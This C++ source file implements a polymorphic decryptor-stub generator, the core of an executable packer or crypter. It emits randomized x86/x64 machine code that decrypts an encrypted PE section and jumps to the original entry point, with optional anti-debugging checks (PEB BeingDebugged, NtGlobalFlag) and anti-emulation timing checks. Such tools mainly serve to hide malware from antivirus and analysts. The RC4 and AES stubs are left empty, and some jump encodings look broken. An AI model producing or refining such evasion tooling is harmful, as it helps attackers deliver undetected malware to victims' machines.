// src/DecryptorGenerator.cpp
#include "DecryptorGenerator.h"
#include <algorithm>

namespace Polymorphic {

DecryptorGenerator::DecryptorGenerator(CryptoRandom& rng)
    : m_rng(rng), m_level(3), m_antiDebug(false), m_antiEmulation(false), m_is64Bit(false) {}

void DecryptorGenerator::SetPolymorphismLevel(int level) {
    m_level = std::max(1, std::min(5, level));
}

void DecryptorGenerator::EnableAntiDebug(bool enable) {
    m_antiDebug = enable;
}

void DecryptorGenerator::EnableAntiEmulation(bool enable) {
    m_antiEmulation = enable;
}

void DecryptorGenerator::SetIs64Bit(bool is64) {
    m_is64Bit = is64;
}

std::vector<uint8_t> DecryptorGenerator::GenerateMovRegImm(X86Register reg,
    uint32_t value) {
    
    std::vector<uint8_t> code;
    std::vector<std::vector<uint8_t>> alternatives;
    
    uint8_t regEnc = static_cast<uint8_t>(reg);
    
    // Method 1: Direct MOV
    alternatives.push_back({
        static_cast<uint8_t>(0xB8 + regEnc),
        static_cast<uint8_t>(value & 0xFF),
        static_cast<uint8_t>((value >> 8) & 0xFF),
        static_cast<uint8_t>((value >> 16) & 0xFF),
        static_cast<uint8_t>((value >> 24) & 0xFF)
    });
    
    // Method 2: XOR reg, reg; PUSH imm; POP reg
    alternatives.push_back({
        0x31,
        static_cast<uint8_t>(0xC0 | (regEnc << 3) | regEnc),
        0x68,
        static_cast<uint8_t>(value & 0xFF),
        static_cast<uint8_t>((value >> 8) & 0xFF),
        static_cast<uint8_t>((value >> 16) & 0xFF),
        static_cast<uint8_t>((value >> 24) & 0xFF),
        static_cast<uint8_t>(0x58 + regEnc)
    });
    
    // Method 3: SUB reg, reg; ADD reg, imm
    alternatives.push_back({
        0x29,
        static_cast<uint8_t>(0xC0 | (regEnc << 3) | regEnc),
        0x81,
        static_cast<uint8_t>(0xC0 + regEnc),
        static_cast<uint8_t>(value & 0xFF),
        static_cast<uint8_t>((value >> 8) & 0xFF),
        static_cast<uint8_t>((value >> 16) & 0xFF),
        static_cast<uint8_t>((value >> 24) & 0xFF)
    });
    
    // Select random alternative
    size_t choice = m_rng.Next(static_cast<uint32_t>(alternatives.size()));
    return alternatives[choice];
}

std::vector<uint8_t> DecryptorGenerator::GenerateXORDecryptor(
    const std::vector<uint8_t>& key, uint32_t rva, uint32_t size, uint32_t originalEntryPoint, uint32_t stubRva) {
    
    std::vector<uint8_t> code;
    
    // Allocate registers
    auto regs = AllocateRegisters(4);
    X86Register dataReg = regs[0];   // Points to encrypted data
    X86Register keyReg = regs[1];    // Points to key
    X86Register sizeReg = regs[2];   // Loop counter
    X86Register keyLenReg = regs[3]; // Key length
    
    // Anti-debug check
    if (m_antiDebug) {
        auto antiDebug = GenerateAntiDebugCode();
        code.insert(code.end(), antiDebug.begin(), antiDebug.end());
    }
    
    // Anti-emulation check
    if (m_antiEmulation) {
        auto antiEmu = GenerateAntiEmulationCode();
        code.insert(code.end(), antiEmu.begin(), antiEmu.end());
    }
    
    // Save registers
    if (m_is64Bit) {
        for (auto reg : regs) {
            code.push_back(0x50 + static_cast<uint8_t>(reg)); // push r_64
        }
    } else {
        code.push_back(0x60);  // PUSHAD
    }
    
    // Initialize data pointer and key pointer (position-independent)
    if (m_is64Bit) {
        // x64 RIP-relative LEA to load absolute virtual addresses
        uint32_t currRva = stubRva + code.size();
        int32_t dataDisp = static_cast<int32_t>(rva) - static_cast<int32_t>(currRva + 7);
        auto movData = GenerateLeaRip(dataReg, dataDisp);
        code.insert(code.end(), movData.begin(), movData.end());
        
        currRva = stubRva + code.size();
        int32_t keyDisp = static_cast<int32_t>(stubRva + 0x100) - static_cast<int32_t>(currRva + 7);
        auto movKey = GenerateLeaRip(keyReg, keyDisp);
        code.insert(code.end(), movKey.begin(), movKey.end());
    } else {
        // x86 GetPC technique to load position-independent pointers
        // CALL $+5
        code.push_back(0xE8); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
        // POP dataReg
        code.push_back(0x58 + static_cast<uint8_t>(dataReg));
        
        // MOV keyReg, dataReg
        code.push_back(0x89);
        code.push_back(0xC0 | (static_cast<uint8_t>(dataReg) << 3) | static_cast<uint8_t>(keyReg));
        
        // ADD dataReg, (rva - POP address)
        uint32_t popRva = stubRva + static_cast<uint32_t>(code.size()) - 1;
        int32_t dataOffset = static_cast<int32_t>(rva) - static_cast<int32_t>(popRva);
        auto addData = GenerateAddRegImm(dataReg, dataOffset);
        code.insert(code.end(), addData.begin(), addData.end());
        
        // ADD keyReg, ((stubRva + 0x100) - POP address)
        int32_t keyOffset = static_cast<int32_t>(stubRva + 0x100) - static_cast<int32_t>(popRva);
        auto addKey = GenerateAddRegImm(keyReg, keyOffset);
        code.insert(code.end(), addKey.begin(), addKey.end());
    }
    
    // Initialize size counter
    auto movSize = GenerateMovRegImm(sizeReg, size);
    code.insert(code.end(), movSize.begin(), movSize.end());
    
    // Initialize key length
    auto movKeyLen = GenerateMovRegImm(keyLenReg, 
        static_cast<uint32_t>(key.size()));
    code.insert(code.end(), movKeyLen.begin(), movKeyLen.end());
    
    // Decryption loop
    uint32_t loopStart = static_cast<uint32_t>(code.size());
    
    // XOR [dataReg], key byte
    code.push_back(0x8A);  // MOV AL, [keyReg]
    code.push_back(0x00 | (static_cast<uint8_t>(keyReg) & 0x7));
    
    code.push_back(0x30);  // XOR [dataReg], AL
    code.push_back(0x00 | (static_cast<uint8_t>(dataReg) & 0x7));
    
    // Increment data pointer
    auto addData = GenerateAddRegImm(dataReg, 1);
    code.insert(code.end(), addData.begin(), addData.end());
    
    // Increment key pointer
    auto addKey = GenerateAddRegImm(keyReg, 1);
    code.insert(code.end(), addKey.begin(), addKey.end());
    
    // Decrement key length counter
    if (m_is64Bit) {
        code.push_back(0xFF);
        code.push_back(0xC8 + static_cast<uint8_t>(keyLenReg));
    } else {
        code.push_back(0x48 + static_cast<uint8_t>(keyLenReg));
    }
    
    // Check if key exhausted
    uint32_t jnzOffset = static_cast<uint32_t>(code.size());
    code.push_back(0x75); // JNZ
    code.push_back(0x00); // placeholder for displacement
    
    uint32_t resetStart = static_cast<uint32_t>(code.size());
    
    // Reset key pointer and key length
    if (m_is64Bit) {
        uint32_t currRva = stubRva + code.size();
        int32_t resetKeyDisp = static_cast<int32_t>(stubRva + 0x100) - static_cast<int32_t>(currRva + 7);
        auto resetKey = GenerateLeaRip(keyReg, resetKeyDisp);
        code.insert(code.end(), resetKey.begin(), resetKey.end());
    } else {
        // CALL $+5
        code.push_back(0xE8); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
        // POP keyReg
        code.push_back(0x58 + static_cast<uint8_t>(keyReg));
        uint32_t popRva = stubRva + static_cast<uint32_t>(code.size()) - 1;
        int32_t keyOffset = static_cast<int32_t>(stubRva + 0x100) - static_cast<int32_t>(popRva);
        auto addKeyReset = GenerateAddRegImm(keyReg, keyOffset);
        code.insert(code.end(), addKeyReset.begin(), addKeyReset.end());
    }
    
    // Reset key length
    auto resetKeyLen = GenerateMovRegImm(keyLenReg, 
        static_cast<uint32_t>(key.size()));
    code.insert(code.end(), resetKeyLen.begin(), resetKeyLen.end());
    
    uint32_t resetEnd = static_cast<uint32_t>(code.size());
    code[jnzOffset + 1] = static_cast<uint8_t>(resetEnd - resetStart);
    
    // Decrement size counter
    if (m_is64Bit) {
        code.push_back(0xFF);
        code.push_back(0xC8 + static_cast<uint8_t>(sizeReg));
    } else {
        code.push_back(0x48 + static_cast<uint8_t>(sizeReg));
    }
    
    // Jump if not zero (back to loopStart).
    // JNZ is 2 bytes; displacement is relative to the next instruction.
    // After push(0x75), code.size() includes the opcode byte.
    // After push(displacement), IP moves to code.size()+1.
    // We want: (loopStart) = (code.size() + 1) + offset => offset = loopStart - code.size() - 1
    code.push_back(0x75);  // JNZ rel8 opcode
    int8_t loopOffset = static_cast<int8_t>(static_cast<int32_t>(loopStart) - static_cast<int32_t>(code.size()) - 1);
    code.push_back(static_cast<uint8_t>(loopOffset));
    
    // Restore registers
    if (m_is64Bit) {
        for (auto it = regs.rbegin(); it != regs.rend(); ++it) {
            code.push_back(0x58 + static_cast<uint8_t>(*it)); // pop r_64
        }
    } else {
        code.push_back(0x61);  // POPAD
    }
    
    // Jump to original entry point
    code.push_back(0xE9);  // JMP rel32
    {
        uint32_t currentOffset = static_cast<uint32_t>(code.size());
        uint32_t jmpNextRva = stubRva + currentOffset + 4;
        int32_t disp = static_cast<int32_t>(originalEntryPoint - jmpNextRva);
        code.push_back(disp & 0xFF);
        code.push_back((disp >> 8) & 0xFF);
        code.push_back((disp >> 16) & 0xFF);
        code.push_back((disp >> 24) & 0xFF);
    }
    
    // Pad stub to exactly 0x100 bytes before appending the key
    if (code.size() < 0x100) {
        code.resize(0x100, 0x90);
    }
    
    // Append key
    code.insert(code.end(), key.begin(), key.end());
    
    // Insert polymorphic junk
    if (m_level >= 2) {
        InsertPolymorphicJunk(code);
    }
    
    return code;
}

std::vector<uint8_t> DecryptorGenerator::GenerateAddRegImm(X86Register reg,
    uint32_t value) {
    
    std::vector<uint8_t> code;
    uint8_t regEnc = static_cast<uint8_t>(reg);
    
    if (m_is64Bit) {
        code.push_back(0x48); // REX.W prefix for 64-bit addition
    }
    
    if (value <= 0x7F) {
        // ADD reg, imm8
        code.push_back(0x83);
        code.push_back(static_cast<uint8_t>(0xC0 + regEnc));
        code.push_back(static_cast<uint8_t>(value));
    } else {
        // ADD reg, imm32
        code.push_back(0x81);
        code.push_back(static_cast<uint8_t>(0xC0 + regEnc));
        code.push_back(static_cast<uint8_t>(value & 0xFF));
        code.push_back(static_cast<uint8_t>((value >> 8) & 0xFF));
        code.push_back(static_cast<uint8_t>((value >> 16) & 0xFF));
        code.push_back(static_cast<uint8_t>((value >> 24) & 0xFF));
    }
    
    return code;
}

std::vector<uint8_t> DecryptorGenerator::GenerateXorRegReg(X86Register reg1,
    X86Register reg2) {
    return {
        0x31,
        static_cast<uint8_t>((static_cast<uint8_t>(reg2) << 3) | 
            static_cast<uint8_t>(reg1))
    };
}

std::vector<uint8_t> DecryptorGenerator::GeneratePushReg(X86Register reg) {
    return { static_cast<uint8_t>(0x50 + static_cast<uint8_t>(reg)) };
}

std::vector<uint8_t> DecryptorGenerator::GeneratePopReg(X86Register reg) {
    return { static_cast<uint8_t>(0x58 + static_cast<uint8_t>(reg)) };
}

std::vector<uint8_t> DecryptorGenerator::GenerateAntiDebugCode() {
    std::vector<uint8_t> code;
    
    if (m_is64Bit) {
        // Check PEB BeingDebugged flag on x64
        // MOV RAX, GS:[0x60]
        code.push_back(0x65); code.push_back(0x48); code.push_back(0x8B); code.push_back(0x04);
        code.push_back(0x25); code.push_back(0x60); code.push_back(0x00); code.push_back(0x00);
        code.push_back(0x00);
        // MOVZX EAX, BYTE PTR [RAX+0x2]
        code.push_back(0x0F); code.push_back(0xB6); code.push_back(0x40); code.push_back(0x02);
        // TEST EAX, EAX
        code.push_back(0x85); code.push_back(0xC0);
        // JNZ +5 (to crash or exit)
        code.push_back(0x75); code.push_back(0x05);
        
        // Check NtGlobalFlag on x64
        // MOV RAX, GS:[0x60]
        code.push_back(0x65); code.push_back(0x48); code.push_back(0x8B); code.push_back(0x04);
        code.push_back(0x25); code.push_back(0x60); code.push_back(0x00); code.push_back(0x00);
        code.push_back(0x00);
        // MOV EAX, [RAX+0xBC] (NtGlobalFlag is at offset 0xBC in x64 PEB)
        code.push_back(0x8B); code.push_back(0x80); code.push_back(0xBC); code.push_back(0x00);
        code.push_back(0x00); code.push_back(0x00);
        // TEST EAX, EAX
        code.push_back(0x85); code.push_back(0xC0);
        // JNZ +5
        code.push_back(0x75); code.push_back(0x05);
    } else {
        // Check PEB BeingDebugged flag (x86)
        code.push_back(0x64); code.push_back(0xA1); code.push_back(0x30); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);  // MOV EAX, FS:[0x30]
        code.push_back(0x0F); code.push_back(0xB6); code.push_back(0x40); code.push_back(0x02);  // MOVZX EAX, BYTE PTR [EAX+0x2]
        code.push_back(0x85); code.push_back(0xC0);  // TEST EAX, EAX
        code.push_back(0x75); code.push_back(0x05);  // JNZ +5 (to crash or exit)
        
        // Check NtGlobalFlag (x86)
        code.push_back(0x64); code.push_back(0xA1); code.push_back(0x30); code.push_back(0x00); code.push_back(0x00); code.push_back(0x00);
        code.push_back(0x8B); code.push_back(0x40); code.push_back(0x68);  // MOV EAX, [EAX+0x68]
        code.push_back(0x85); code.push_back(0xC0);  // TEST EAX, EAX
        code.push_back(0x75); code.push_back(0x05);  // JNZ +5
    }
    
    return code;
}

std::vector<uint8_t> DecryptorGenerator::GenerateAntiEmulationCode() {
    std::vector<uint8_t> code;
    
    // CPUID check
    code.push_back(0x53);  // PUSH EBX (in x64 this pushes RBX)
    code.push_back(0x31); code.push_back(0xC0);  // XOR EAX, EAX
    code.push_back(0x0F); code.push_back(0xA2);  // CPUID
    code.push_back(0x5B);  // POP EBX (in x64 this pops RBX)
    
    // RDTSC timing check
    code.push_back(0x0F); code.push_back(0x31);  // RDTSC
    code.push_back(0x89); code.push_back(0xC3);  // MOV EBX, EAX
    code.push_back(0x0F); code.push_back(0x31);  // RDTSC
    code.push_back(0x29); code.push_back(0xD8);  // SUB EAX, EBX
    code.push_back(0x3D); code.push_back(0x00); code.push_back(0x10); code.push_back(0x00); code.push_back(0x00);  // CMP EAX, 0x1000
    code.push_back(0x77); code.push_back(0x05);  // JA +5 (if too fast, probably emulated)
    
    return code;
}

void DecryptorGenerator::InsertPolymorphicJunk(std::vector<uint8_t>& code) {
    // Append polymorphic NOP padding at the tail only.
    // We CANNOT insert into the middle of existing code because all
    // displacements and jump offsets are pre-calculated before this call.
    static const std::vector<std::vector<uint8_t>> junkTemplates = {
        {0x90},                       // NOP
        {0x66, 0x90},                 // 2-byte NOP
        {0x0F, 0x1F, 0x00},           // NOP DWORD PTR [RAX]
        {0x0F, 0x1F, 0x40, 0x00},     // NOP DWORD PTR [RAX+0]
        {0x87, 0xC0},                 // XCHG EAX, EAX
    };
    size_t numJunk = 8 + m_rng.Next(8);
    for (size_t i = 0; i < numJunk; ++i) {
        const auto& tmpl = junkTemplates[m_rng.Next(static_cast<uint32_t>(junkTemplates.size()))];
        code.insert(code.end(), tmpl.begin(), tmpl.end());
    }
}

std::vector<X86Register> DecryptorGenerator::AllocateRegisters(int count) {
    std::vector<X86Register> available = {
        X86Register::ECX, X86Register::EDX, X86Register::EBX,
        X86Register::ESI, X86Register::EDI
    };
    
    std::shuffle(available.begin(), available.end(), 
        std::mt19937(m_rng.Next()));
    
    std::vector<X86Register> result;
    for (int i = 0; i < count && i < static_cast<int>(available.size()); ++i) {
        result.push_back(available[i]);
    }
    
    return result;
}

std::vector<uint8_t> DecryptorGenerator::Generate(
    const std::vector<uint8_t>& key,
    PayloadEncryptor::Algorithm algo,
    uint32_t encryptedSectionRva,
    uint32_t encryptedSectionSize,
    uint32_t originalEntryPoint,
    uint32_t stubRva) {
    
    switch (algo) {
        case PayloadEncryptor::Algorithm::XOR:
            return GenerateXORDecryptor(key, encryptedSectionRva, 
                encryptedSectionSize, originalEntryPoint, stubRva);
        case PayloadEncryptor::Algorithm::RC4:
            return GenerateRC4Decryptor(key, encryptedSectionRva,
                encryptedSectionSize);
        case PayloadEncryptor::Algorithm::AES:
            return GenerateAESDecryptor(key, encryptedSectionRva,
                encryptedSectionSize);
        default:
            return GenerateXORDecryptor(key, encryptedSectionRva, 
                encryptedSectionSize, originalEntryPoint, stubRva);
    }
}

std::vector<uint8_t> DecryptorGenerator::GenerateRC4Decryptor(
    const std::vector<uint8_t>& /*key*/, uint32_t /*rva*/, uint32_t /*size*/) {
    // RC4 KSA + PRGA implementation
    std::vector<uint8_t> code;
    
    // Similar structure to XOR but with RC4 state initialization
    // Simplified for brevity - full implementation would include
    // the complete RC4 key scheduling algorithm
    
    return code;
}

std::vector<uint8_t> DecryptorGenerator::GenerateAESDecryptor(
    const std::vector<uint8_t>& /*key*/, uint32_t /*rva*/, uint32_t /*size*/) {
    // AES decryption stub
    std::vector<uint8_t> code;
    
    // Would include AES key expansion and decryption rounds
    // Simplified for brevity
    
    return code;
}

std::vector<uint8_t> DecryptorGenerator::GenerateLeaRip(X86Register reg, int32_t displacement) {
    std::vector<uint8_t> code;
    uint8_t regId = static_cast<uint8_t>(reg);
    if (m_is64Bit) {
        uint8_t rex = 0x48; // REX.W
        if (regId >= 8) rex |= 0x04; // REX.R
        code.push_back(rex);
        code.push_back(0x8D); // LEA opcode
        code.push_back(((regId & 0x7) << 3) | 0x05); // ModRM: mod=00, reg=regId, rm=101 (RIP)
        code.push_back(displacement & 0xFF);
        code.push_back((displacement >> 8) & 0xFF);
        code.push_back((displacement >> 16) & 0xFF);
        code.push_back((displacement >> 24) & 0xFF);
    }
    return code;
}

} // namespace Polymorphic